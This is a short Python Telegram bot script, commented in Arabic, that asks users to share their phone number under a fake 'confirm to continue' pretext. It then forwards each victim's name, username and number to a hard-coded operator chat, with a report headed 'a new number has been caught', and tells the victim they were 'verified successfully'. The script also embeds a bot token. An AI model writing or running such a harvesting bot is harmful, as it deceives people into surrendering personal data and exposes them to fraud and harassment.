import logging
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# التوكن والـ Chat ID الخاص بك
BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo"
ADMIN_CHAT_ID = "7713496654"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # إنشاء زر طلب رقم الهاتف
    contact_button = KeyboardButton(text="📱 مشاركة رقم الهاتف", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)

    await update.message.reply_text(
        "أهلاً بك! لتأكيد الاستمرار، يرجى الضغط على الزر أدناه لمشاركة رقمك:",
        reply_markup=reply_markup
    )

async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    contact = update.message.contact
    
    if contact:
        phone_number = contact.phone_number
        name = user.first_name
        username = f"@{user.username}" if user.username else "لا يوجد"
        
        report = (
            f"🎯 **تم اصطياد رقم جديد!**\n\n"
            f"👤 الاسم: {name}\n"
            f"🔗 المعرف: {username}\n"
            f"📞 الرقم: `{phone_number}`"
        )
        
        # إرسال الرقم لك مباشرة على الآي دي الخاص بك
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=report, parse_mode="Markdown")
        await update.message.reply_text("تم التحقق بنجاح! شكراً لك.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, receive_contact))
    
    print("Bot is running and waiting for targets...")
    app.run_polling()
